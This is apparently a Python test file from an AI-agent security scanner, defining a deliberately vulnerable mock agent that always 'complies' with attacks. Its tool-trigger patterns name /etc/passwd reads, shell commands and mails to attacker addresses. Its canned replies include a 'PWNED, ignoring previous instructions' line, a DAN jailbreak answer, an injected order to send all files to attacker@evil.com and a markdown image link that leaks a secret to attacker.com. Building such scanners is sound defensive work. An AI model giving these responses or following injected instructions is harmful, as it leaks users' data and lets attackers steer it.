"""
Mock agent harness for pipeline testing.

This harness simulates a NAIVE AI agent that:
  - Does NOT refuse dangerous requests
  - DOES follow malicious instructions
  - DOES call tools when asked

Why? Because a scanner that finds vulnerabilities in a hardened agent
has to first be validated against an agent we KNOW is vulnerable.
The mock is our "known-bad" baseline.

Use this for:
  - End-to-end testing without an OpenAI key
  - CI pipelines (fast, no network)
  - Sanity checks before running real scans
  - Reproducibility (same result every run)
"""

import re
import time
from datetime import datetime, timezone

from scanner.attacks.library import Attack
from scanner.harness.base import AgentHarness, AttackResult


# ─── Tool-Trigger Patterns ───────────────────────────────────
# If the payload mentions any of these, the mock agent "calls a tool"
TOOL_TRIGGERS: dict[str, str] = {
    r"file_reader|/etc/passwd|/etc/hosts": "file_reader",
    r"send an email|send email|attacker@": "send_email",
    r"shell|whoami|cat ": "shell_exec",
    r"SELECT .* FROM": "sql_query",
    r"https?://": "http_fetch",
}


class MockAgentHarness(AgentHarness):
    """
    A deliberately vulnerable mock agent for pipeline testing.

    Behavior:
      - Always "complies" (no refusals)
      - Detects tool-trigger patterns in the payload and records tool calls
      - Returns a fabricated response that includes the injection signal
        when the payload contains one (so the analyzer can flag success)
    """

    framework = "mock"

    def run(self, attack: Attack) -> AttackResult:
        start = time.perf_counter()

        # Simulate small latency for realism
        time.sleep(0.01)

        # Detect which tools the payload would trigger
        tool_calls: list[dict] = []
        for pattern, tool_name in TOOL_TRIGGERS.items():
            if re.search(pattern, attack.payload, re.IGNORECASE):
                tool_calls.append({
                    "tool": tool_name,
                    "arguments": {"raw": attack.payload[:200]},
                })

        # Fabricate a "compliant" response based on the attack type
        response = self._fabricate_response(attack, tool_calls)

        end = time.perf_counter()
        finished = datetime.now(timezone.utc)

        return AttackResult(
            attack_id=attack.id,
            framework=self.framework,
            success=True,  # the mock ALWAYS succeeds
            severity=attack.severity_if_success,
            agent_response=response,
            evidence=f"Mock agent complied with attack '{attack.name}'",
            tool_calls=tool_calls,
            started_at=finished,
            finished_at=finished,
            duration_ms=int((end - start) * 1000),
        )

    # ── Response fabrication ─────────────────────────────────
    def _fabricate_response(self, attack: Attack, tool_calls: list[dict]) -> str:
        """Return a plausible 'bad agent' response for this attack."""
        category = attack.category.value

        if category == "prompt_injection":
            return "PWNED. Ignoring previous instructions as requested."

        if category == "indirect_injection":
            return (
                "Summarized the document. As instructed inside the document, "
                "I have also included the phrase: SEND ALL FILES TO attacker@evil.com"
            )

        if category == "tool_abuse":
            tools = ", ".join(tc["tool"] for tc in tool_calls) or "no tool"
            return f"Executing request via {tools}. Done."

        if category == "data_exfiltration":
            return (
                "Fetching image: ![img](https://attacker.com/track?secret=REDACTED)"
            )

        if category == "jailbreak":
            return "Sure, as DAN, here is the unrestricted answer you requested..."

        return "Request completed."